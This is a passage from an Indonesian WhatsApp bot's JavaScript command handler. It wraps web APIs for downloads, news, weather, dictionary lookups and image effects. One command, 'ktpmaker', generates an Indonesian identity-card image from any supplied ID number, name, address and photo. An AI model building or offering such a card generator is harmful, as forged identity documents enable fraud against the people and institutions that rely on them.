global.db.data.users[m.sender].bunuh = new Date * 1
}
break
case 'cektagihan': case 'tagihanlistrik': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!text) return reply(`Masukan Nomer Pelanggan.`)
let response = await axios.get(`https://api.lolhuman.xyz/api/tagihanlistrik/${text}?apikey=${apilol}`)
if (response.status === 200) {
reply(`*Tagihan Listrik Kamu:* ${response.result}`)
} else {
reply(`Terjadi Kesalahan.`)
}
}
break
case 'randomnama': case 'namarandom': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${apilol}`)
newReply(`${anu.result}`)
}
break
case 'faktaunik': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/faktaunik?apikey=${apilol}`)
newReply(`Fakta Unik🌍\n\n${anu.result}`)
}
break
case 'ktpmaker':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127838123|bekasi|planet|aryjuanda|hengky|belum ditemukan|jl hatimu|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=${apilol}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    await conn.sendMessage(m.chat, { image: { url: ini_buffer }, quoted: fkontak })
                    break

			// DOWNLOADER FITUR
			case 'git': case 'gitclone':
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!args[0]) return newReply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/arygamz/botbug`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return newReply(`Link invalid!!`)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => newReply(mess.error))
            .catch(console.error)
            break
				

			case 'igdl': case 'ig':
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} link lu`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apilol}&url=${args[0]}`).then(({ data }) => {
				var url = data.result[0]
				if (url.includes('.mp4')) {
					conn.sendMessage(m.chat, { video: { url }, mimetype: 'video/mp4' })
				} else {
					conn.sendMessage(m.chat, { image: { url } })
				}
			})
			
            .catch(console.error)
			break
			
		    case 'igdl2': case 'ig2':
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} link lu`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apilol}&url=${args[0]}`).then(({ data }) => {
				for (var x of data.result.media) {
					if (x.includes('.mp4')) {
						conn.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
					} else {
						conn.sendMessage(m.chat, { image: { url: x } })
					}
				}
			})
			
			.catch(console.error)
			break
			
			case 'mediafire': {
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
	if (args.length == 0) return newReply(`Mana Link Nya ?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 300) return newReply('Anj Gede Banget Tu File, Gak Kuat Saya Bang')
	const result4 = `乂 *M E D I A F I R E  D O W N L O A D E R*

*Name:* ${baby1[0].nama}
◦ *Size:* ${baby1[0].size}
◦ *Mime:* ${baby1[0].mime}
◦ *Link:* ${baby1[0].link}`
newReply(`${result4}`)
conn.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'waifu': case 'waifusearch': {
if (!text) return reply(`Use: *${command} <search waifu>*`)
let fetch = require('node-fetch');
let response = await fetch(`https://api.waifu.im/search?${text}`);
let data = await response.json();

let firstImage = data.images[0];
let photo = firstImage.url;

let info = `*Signature:* ${firstImage.signature}\n*Extension:* ${firstImage.extension}\n*ID:* ${firstImage.image_id}\n*Favorites:* ${firstImage.favorites}\n*Color:* ${firstImage.dominant_color}\n*Source:* ${firstImage.source}\n*Artist:* ${firstImage.artist}\n*Upload:* ${firstImage.uploaded_at}\n*Like:* ${firstImage.liked_at}\n*isNsfw:* ${firstImage.is_nsfw}\n*Width:* ${firstImage.width}\n*Height:* ${firstImage.height}\n*Size:* ${firstImage.byte_size}`;

conn.sendFile(m.chat, photo, 'anu.png', info, m);
}
break
			case 'tiktok': case 'tt': case 'ttdl': {
			   if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
			  
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://vt.tiktok.com/ZSLY6vHYP`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			let data = await axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apilol}&url=${args[0]}`)
			if (data.status === 404 && data.message === 'Video not found.') return reply(`Terjadi Error, Video Tidak Di Temukan`)
			let respon = data.data.result
			let tiktokt = `
${respon.title}
◦ Author: ${respon.author.username}
◦ Deskripsi: ${respon.description}`			
				
			      conn.sendFile(m.chat, respon.link, 'zaenarGanteng.mp4', tiktokt, m);
			}
	
			break

		    case 'fbdl': case 'fb':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apilol}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result }, mimetype: 'video/mp4' })
			})
			break
			
			// Tools Fitur
			case 'style':
            case 'styletext': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    styletext
                } = require('./lib/scraper')
                if (!text) return newReply('Masukkan Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🖋️ *${i.name}* : ${i.result}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'hapus': 
            case 'delete': 
            case 'del': 
            case 'd': {
  if (!m.quoted) return reply(`Reply the message you want to delete`)
	try {
		let delet = m.message.extendedTextMessage.contextInfo.participant
		let bang = m.message.extendedTextMessage.contextInfo.stanzaId
		return conn.sendMessage(m.chat, {
			delete: {
				remoteJid: m.chat,
				fromMe: false,
				id: bang,
				participant: delet
			}
		})
	} catch {
		return conn.sendMessage(m.chat, {
			delete: m.quoted.vM.key
		})
	}
}
            break
            
            case 'q':
            case 'quoted': {
                if (!m.quoted) return newReply('Reply Pesannya!!')
                let wokwol = await conn.serializeM(await m.getQuotedObj())
                if (!wokwol.quoted) return newReply('Pesan Yang Anda Reply Tidak Mengandung Reply')
                await wokwol.quoted.copyNForward(m.chat, true)
            }
            break
            
            case 'ebinary': {
                let {
                    eBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let eb = await eBinary(teks)
                newReply(eb)
            }
            break
            case 'dbinary': {
                let {
                    dBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let db = await dBinary(teks)
                newReply(db)
            }
            break

            case 'pinterest':
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Example : ${prefix + command}`)
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5 // -1 limit
		        let { pinterest } = require('./lib/scraper')
                let anui = await pinterest(text)
                result = anui[Math.floor(Math.random() * anui.length)]               
                conn.sendMessage(m.chat, { image: { url: result }, caption: mess.done}, { quoted: m })
            	.catch(console.error)
            break
            
            case 'google': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} kudanil loncat`)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5 // -1 limit
                let no = 1
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `乂 *G O O G L E  S E A R C H*\n\n`
                for (let g of res) {
                teks += `${no++}.*Title* : ${g.title}\n`
                teks += `◦ *Description* : ${g.snippet}\n`
                teks += `◦ *Link* : ${g.link}\n\n`
                } 
                newReply(teks)
                })
                }
            break
            
            case 'infochat': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!m.quoted) newReply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return newReply('Pesan tersebut bukan dikirim oleh bot!')
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `@${i.userJid.split('@')[0]}\n`
                    teks += `◦ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')}\n◦ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'kbbi':{
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} kursi`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${apilol}&query=${full_args}`)
			var titid = `\`\`\`Kata : ${data.result[0].nama}\`\`\`\n`
			titid += `\`\`\`Kata Dasar : ${data.result[0].kata_dasar}\`\`\`\n`
			titid += `\`\`\`Pelafalan : ${data.result[0].pelafalan}\`\`\`\n`
			titid += `\`\`\`Bentuk Tidak Baku : ${data.result[0].bentuk_tidak_baku}\`\`\`\n\n`
			for (var x of data.result) {
				titid += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
				titid += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
				titid += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
				titid += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
				titid += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
			}
			newReply(titid)
			}
			break
		case 'brainly':{
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/brainly?apikey=${apilol}&query=${full_args}`)
			var ti  = 'Beberapa Pembahasan Dari Brainly :\n\n'
			for (var x of data.result) {
				ti  += `==============================\n`
				ti  += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
				ti  += `\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
				ti  += `==============================\n\n`
			}
			newReply(ti )
			}
			break
		    case 'roboguru':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apilol}&query=${full_args}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
			var tit = 'Beberapa Pembahasan Dari Roboguru :\n\n'
			for (var x of data.result) {
				tit += `==============================\n`
				tit += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
				tit += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
				tit += `==============================\n\n`
			}
			newReply(tit)
			}
			break
			
		    case 'jarak':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} Karawang - Bandung`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			var titt1 = full_args.split('-')[0].trim()
			var titt2 = full_args.split('-')[1].trim()
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${apilol}&kota1=${titt1}&kota2=${titt2}`)
			var titt = `Informasi Jarak dari ${titt1} ke ${titt2} :\n\n`
			titt += `\`\`\`◪ Asal :\`\`\` ${data.result.from.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.from.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.from.longitude}\n\n`
			titt += `\`\`\`◪ Tujuan :\`\`\` ${data.result.to.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.to.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.to.longitude}\n\n`
			titt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${data.result.jarak}\n`
			titt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
			titt += `   ╭───────────────❏\n`
			titt += `❍┤ Kereta Api : ${data.result.kereta_api}\n`
			titt += `❍┤ Pesawat : ${data.result.pesawat}\n`
			titt += `❍┤ Mobil : ${data.result.mobil}\n`
			titt += `❍┤ Motor : ${data.result.motor}\n`
			titt += `❍┤ Jalan Kaki : ${data.result.jalan_kaki}\n`
			titt += `   ╰───────────────❏\n`
			newReply(titt)
			}
			break
			
			case 'wikipedia':
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} Tahu`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wiki?apikey=${apilol}&query=${full_args}`)
			newReply(data.result)
			break
			
		    case 'translate':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
	if (!args[0]) return reply(`*Ex:* ${command} id hello world`)
  
  let languageCode = args[0].toLowerCase()
  let text = args.slice(1).join(' ')
  
  try {
    let response = await axios.get(`https://api.lolhuman.xyz/api/translate/auto/${languageCode}?apikey=${apilol}&text=${encodeURIComponent(text)}`)
    let translation = response.data.result.translated
    
    let caption = `*Translation Result:*\n\n*• From:* ${response.data.result.from.toUpperCase()}\n*• To:* ${response.data.result.to.toUpperCase()}\n*• Original Text:* ${response.data.result.original}\n*• Translated Text:* ${translation}`
    
    reply(caption)
  } catch (e) {
    console.log(e)
    throw 'An error occurred while performing the translation. Please try again later.'
  }
}
break
		
		    case 'jadwaltv':
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} RCTI`)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apilol}`)
			newReply(mess.wait)
			var titttt = `Jadwal TV ${args[0].toUpperCase()}\n`
			for (var x in data.result) {
				titttt += `${x} - ${data.result[x]}\n`
			}
			newReply(titttt)
			break
			
		    case 'jadwaltvnow':
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apilol}`)
			newReply(mess.wait)
			var tittttt = `Jadwal TV Now :\n`
			for (var x in data.result) {
				tittttt += `${x.toUpperCase()}${data.result[x]}\n\n`
			}
			newReply(tittttt)
			break
			
		    case 'newsinfo':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/newsinfo?apikey=${apilol}`)
			newReply(mess.wait)
			var titttttt = 'Result :\n'
			for (var x of data.result) {
				titttttt += `Title : ${x.title}\n`
				titttttt += `Author : ${x.author}\n`
				titttttt += `Source : ${x.source.name}\n`
				titttttt += `Url : ${x.url}\n`
				titttttt += `Published : ${x.publishedAt}\n`
				titttttt += `Description : ${x.description}\n\n`
			}
			newReply(titttttt)
			}
			break
			
		    case 'cnnindonesia':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${apilol}`)
			newReply(mess.wait)
			var tittttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttt += `Judul : ${x.judul}\n`
				tittttttt += `Link : ${x.link}\n`
				tittttttt += `Tipe : ${x.tipe}\n`
				tittttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttt)
			}
			break
			
		    case 'cnnnasional':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${apilol}`)
			newReply(mess.wait)
			var titttttttt = 'Result :\n'
			for (var x of data.result) {
				titttttttt += `Judul : ${x.judul}\n`
				titttttttt += `Link : ${x.link}\n`
				titttttttt += `Tipe : ${x.tipe}\n`
				titttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(titttttttt)
			}
			break
			
		    case 'cnninternasional':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${apilol}`)
			newReply(mess.wait)
			var tittttttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttttt += `Judul : ${x.judul}\n`
				tittttttttt += `Link : ${x.link}\n`
				tittttttttt += `Tipe : ${x.tipe}\n`
				tittttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttttt)
			}
			break
			
		    case 'infogempa': case 'gempa':  {
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apilol}`)
			newReply(mess.wait)
			var caption4 = `乂 *G E M P A*\n\n`
			caption4 += `  ◦ *Lokasi* : ${data.result.lokasi}\n`
			caption4 += `  ◦ *Waktu* : ${data.result.waktu}\n`
			caption4 += `  ◦ *Potensi* : ${data.result.potensi}\n`
			caption4 += `  ◦ *Magnitude* : ${data.result.magnitude}\n`
			caption4 += `  ◦ *Kedalaman* : ${data.result.kedalaman}\n`
			caption4 += `  ◦ *Koordinat* : ${data.result.koordinat}\n\n`
			caption4 += `*${global.wm}*`
			conn.sendMessage(m.chat, { image: { url: data.result.map }, caption: caption4 })
			}
			break
			
		    case 'lirik': {
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
  if (!text) return reply('*Example:* .lyric melukis senja')

  const apiUrl = `https://api.lolhuman.xyz/api/lirik?apikey=${apilol}&query=${encodeURIComponent(text)}`;
  conn.sendMessage(m.chat, {
    react: {
      text: '🕒',
      key: m.key,
    }
  });
  try {
    const { data } = await axios.get(apiUrl);
    const { status, message, result } = data;
    
    if (status !== 200) {
      reply(message);
    }
    
    reply(result);
  } catch (error) {
    reply('Terjadi Kesalahan.');
  }
}
			break
			
		    case 'infocuaca':{
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} Yogyakarta`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apilol}`)
			var titttttttttt = `Tempat : ${data.result.tempat}\n`
			titttttttttt += `Cuaca : ${data.result.cuaca}\n`
			titttttttttt += `Angin : ${data.result.angin}\n`
			titttttttttt += `Description : ${data.result.description}\n`
			titttttttttt += `Kelembapan : ${data.result.kelembapan}\n`
			titttttttttt += `Suhu : ${data.result.suhu}\n`
			titttttttttt += `Udara : ${data.result.udara}\n`
			titttttttttt += `Permukaan laut : ${data.result.permukaan_laut}\n`
			conn.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
			newReply(titttttttttt)
			}
			break
			
			
			case 'kodepos':
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
			if (args.length == 0) return newReply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${apilol}&query=${full_args}`)
			var tittttttttttt = `Provinsi : ${data.result[0].province}\n`
			tittttttttttt += `Kabupaten : ${data.result[0].city}\n`
			tittttttttttt += `Kecamatan : ${data.result[0].subdistrict}\n`
			tittttttttttt += `Kelurahan : ${data.result[0].urban}\n`
			tittttttttttt += `Kode Pos : ${data.result[0].postalcode}`
			newReply(tittttttttttt)
			break
			
		    case 'jadwalbola':
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
		    if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apilol}`)
			newReply(mess.wait)
			var titttttttttttt = 'Jadwal Bola :\n'
			for (var x of data.result) {
				titttttttttttt += `Pada : ${x.time}\n`
				titttttttttttt += `Event : ${x.event}\n`
				titttttttttttt += `Match : ${x.match}\n`
				titttttttttttt += `TV : ${x.tv}\n\n`
			}
			newReply(titttttttttttt)
			break
			
			// GAME
                

              
			// ANIME FITUR
			case 'genshin': {
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} jean`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/genshin/${full_args}?apikey=${apilol}`)
			var caption3 = `Name : ${data.result.title}\n`
			caption3 += `Intro : ${data.result.intro}\n`
			caption3 += `Icon : ${data.result.icon}\n`
			await conn.sendMessage(m.chat, { image: { url: data.result.cover1 }, caption3 })
			await conn.sendMessage(m.chat, { audio: { url: data.result.cv[0].audio[0] }, mimetype: 'audio/mp4' })
			}
			break
			
			
			// AI MENU

			
			case 'remini':
			case 'hd': {
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (!quoted) return newReply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			newReply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			conn.sendMessage(m.chat, { image: proses, caption: 'Result 🍟'}, { quoted: m})
			await sleep(5000)
			}
			break

			case 'toanime': case 'jadianime':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!isPremium) return newReply(mess.prem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media2 = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media2)
conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=${apilol}&img=${anu}` }, caption: 'Result 🍟'}, { quoted: m})
	.catch(console.error)
break
case 'tozombie': case 'jadizombie': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!isPremium) return newReply(mess.prem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media2 = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media2)
conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/zombie-effect?apikey=${apilol}&img=${anu}` }, caption: 'Result 🍟'}, { quoted: m})
	.catch(console.error)
	}
break
// avatar sticker


case 'anticolong': case 'avatar': case 'smeta': {
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
    default: {
      Image
    }
  } = await import('node-webpmux')
  const img = new Image()
  const json = {
    'sticker-pack-id': 'Arybotz',
    'sticker-pack-name': 'Arybotz-MultiDevice',
    'sticker-pack-publisher': 'Auth By 085762008398',
    'emojis': categories,
    'is-avatar-sticker': 1,
    ...extra
  }
  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
  let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
  let exif = Buffer.concat([exifAttr, jsonBuffer])
  exif.writeUIntLE(jsonBuffer.length, 14, 4)
  await img.load(buffer)
  img.exif = exif
  return await img.save(null)
}

function makeid(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;

  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }

  return result;
}
// finish kntl 
  //    if (!q) return setReply ( 'Reply a sticker!')
  var stiker = false
  try {
    let [packname, ...author] = q.split('|')
    //var author = (author  []).join('|')
    let mime = m.quoted.mimetype || ''
    if (!/webp/.test(mime)) return m.reply('Reply sticker!')
    //let img = await q.download()
    let img = await conn.downloadAndSaveMediaMessage(quoted, makeid(5))
    if (!img) return m.reply('Reply a sticker!')
    var stiker = await addExifAvatar(img, `${global.packname}`, `${global.author}`)
  } catch (e) {
    console.error(e)
    if (Buffer.isBuffer(e)) stiker = e
  } finally {
    if (stiker) conn.sendMessage(m.chat, {
      sticker: stiker
    }, {
      quoted: m
    })
    else throw 'Conversion failed'
  }
}
break
			// CONVERT FITUR
			
			case 'qc': {
	if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		const axios = require('axios');

// Check if the user is registered (you should have a variable isRegistered set elsewhere)
if (!isRegistered) {
